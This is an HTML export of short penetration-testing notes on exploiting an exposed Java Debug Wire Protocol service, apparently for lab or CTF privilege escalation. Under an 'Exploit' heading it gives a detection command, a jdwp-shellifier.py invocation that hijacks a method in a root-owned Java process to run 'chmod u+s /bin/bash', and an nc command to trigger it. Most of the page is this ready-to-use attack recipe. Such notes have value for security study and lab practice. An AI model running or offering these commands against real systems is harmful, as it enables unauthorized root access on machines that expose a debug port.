<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>30 - Java debug wire protocol</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>30 - Java debug wire protocol</h1><br/><p><strong><h2>INtro</h2></strong><ul><li><a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/">https://ioactive.com/hacking-java-debug-wire-protocol-or-how/</a></li><li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol">https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol</a></li><li>Normally this debugger is run on port 8000 and if you establish a TCP connection with the port and send &quot;JDWP-Handshake&quot;, the server should respond you with the same string.</li></ul></p><p></p><p></p><p><strong><h2>Prerequisites</h2></strong><ul><li>port 8000 open </li><li>ps aux |grep root <ul><li>java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java</li></ul></li><li>Goal : hijack a method </li></ul></p><p></p><p></p><p><strong><h2>Exploit</h2></strong></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># DETECT </span><br />* <span style="color:#ff9d00;font-weight:700">ps</span> aux <span style="color:#ff9d00;font-weight:700">|grep</span> root <span style="color:#ff9d00;font-weight:700">|grep</span> jdwp <br /><br /><span style="color:#0088ff;font-weight:400"># exploit </span><br /><span style="color:#ff9d00;font-weight:700">read</span> source and find a trigger function <br /><br /><span style="color:#0088ff;font-weight:400">## commands </span><br />python3 jdwp-shellifier.py -t localhost --break-on <span style="color:#3ad900;font-weight:400">&quot;java.net.ServerSocket.accept&quot;</span> --cmd <span style="color:#3ad900;font-weight:400">&quot;chmod u+s /bin/bash&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">## example of triggering </span><br />nc localhost <span style="color:#7f0044;font-weight:400">$opened</span> port by service</pre></div></p></div>
</body>
</html>
